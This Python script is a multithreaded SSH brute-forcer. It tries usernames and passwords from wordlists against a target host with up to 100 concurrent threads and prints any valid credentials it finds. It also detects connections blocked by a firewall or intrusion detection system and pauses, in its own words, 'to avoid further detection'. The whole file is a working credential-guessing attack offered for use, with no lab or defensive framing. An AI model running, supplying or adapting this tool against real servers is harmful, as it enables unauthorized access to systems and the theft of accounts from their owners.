import argparse
import pexpect
from pexpect import pxssh
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time
import sys

# Constants for better readability
TIMEOUT_SECONDS = 5
MAX_WORKERS = 100
BACKOFF_DELAY_SECONDS = 30 # Time to wait if a firewall blocks us

# Global variables to store results and manage concurrency
# Note: Using a list and a lock is acceptable for this script's scale.
# A more advanced approach might use a queue or a shared state object.
found_credentials = []
found_lock = Lock()
attempts_counter = 0

def attempt_login(host, username, password):
    """
    Attempts an SSH login for a single username/password pair.
    
    Returns True on success, False on failure, and raises a specific
    exception if a connection block is detected.
    """
    try:
        # pxssh manages its own connection state per instance.
        s = pxssh.pxssh(timeout=TIMEOUT_SECONDS)
        
        # Use pxssh's login method, which internally handles a lot of the
        # pexpect logic for us.
        s.login(host, username, password, auto_prompt_reset=False)
        
        # If the login succeeds, we reach this line.
        with found_lock:
            found_credentials.append({'username': username, 'password': password})
            s.logout()
        return True
    
    except pexpect.exceptions.EOF as e:
        # This is the key error to handle. It means the connection
        # was closed prematurely, likely by a firewall or IDS.
        with found_lock:
            print(f"[!] {host} is likely blocking SSH connections after too many failed attempts.")
            print(f"    Pausing for {BACKOFF_DELAY_SECONDS} seconds to avoid further detection.")
        # Re-raise a custom exception to signal the main loop to pause.
        # This is a cleaner way to handle flow control than a global flag.
        raise ConnectionBlockedException("SSH connection blocked.") from e
        
    except pexpect.exceptions.TIMEOUT:
        # Handle a timeout explicitly, which means the host is not responding.
        with found_lock:
            print(f"[-] Connection timed out for {host}: {username}:{password}")
    
    except pxssh.ExceptionPxssh as e:
        # Catch the general pxssh error for a failed login attempt.
        # This is for "Permission denied" and similar errors.
        pass
    
    except Exception as e:
        # Catch any other unexpected errors, which are important to log.
        with found_lock:
            print(f"[!] An unexpected error occurred for {host}: {username}:{password}: {e}")
    
    return False

# Custom exception to signal a connection block
class ConnectionBlockedException(Exception):
    pass

def main():
    """Main function to parse arguments and run the SSH brute-force."""
    parser = argparse.ArgumentParser(
        prog='Python SSH Brute-Forcer',
        description='Attempts to brute-force SSH credentials using wordlists.',
        epilog='Example: python bruteforcer.py -t 192.168.1.1 -p passwords.txt -U admin'
    )
    # ... (argument parsing remains the same) ...
    parser.add_argument("--target", "-t", type=str, required=True, help="Target SSH IP address or hostname.")
    parser.add_argument("--passlist", "-p", type=str, required=True, help="Path to the password wordlist file.")
    parser.add_argument("--userlist", "-u", type=str, help="Path to the username wordlist file (optional, if not using -U).")
    parser.add_argument("--username", "-U", type=str, help="Single username to try (optional, if not using -u).")
    args = parser.parse_args()

    if not args.username and not args.userlist:
        parser.error("Either --username or --userlist must be provided.")
    if args.username and args.userlist:
        parser.error("Cannot use both --username and --userlist simultaneously. Choose one.")

    host = args.target

    try:
        with open(args.passlist, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading password list file: {e}")
        sys.exit(1)

    if args.username:
        usernames = [args.username]
    else:
        try:
            with open(args.userlist, "r") as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading username list file: {e}")
            sys.exit(1)

    # Use ThreadPoolExecutor for concurrent execution.
    # The `as_completed` method is a more efficient way to process results
    # as they finish, rather than waiting for all of them.
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                future = executor.submit(attempt_login, host, username, password)
                futures.append(future)

        try:
            for future in as_completed(futures):
                try:
                    result = future.result()
                    # If a password was found, we can try to stop the other workers.
                    if found_credentials:
                        print("\n[+] Found credentials! Shutting down scanner...")
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                except ConnectionBlockedException:
                    print(f"    Sleeping for {BACKOFF_DELAY_SECONDS} seconds...")
                    time.sleep(BACKOFF_DELAY_SECONDS)
                    # Here we could re-queue the remaining tasks, but for this
                    # script, we'll just let the executor shut down.
                    print("    Resuming scan...")
                except Exception as e:
                    # Catch any exceptions that weren't handled in the thread
                    # for better debugging.
                    print(f"[!] An error occurred in a worker thread: {e}")

        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user. Shutting down...")
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(0)

    if found_credentials:
        print("\n--- Scan Complete ---")
        print("Found the following valid credentials:")
        for cred in found_credentials:
            print(f"  Username: {cred['username']}, Password: {cred['password']}")
    else:
        print("\n--- Scan Complete ---")
        print("No valid credentials found within the provided wordlists.")

if __name__ == '__main__':
    main()

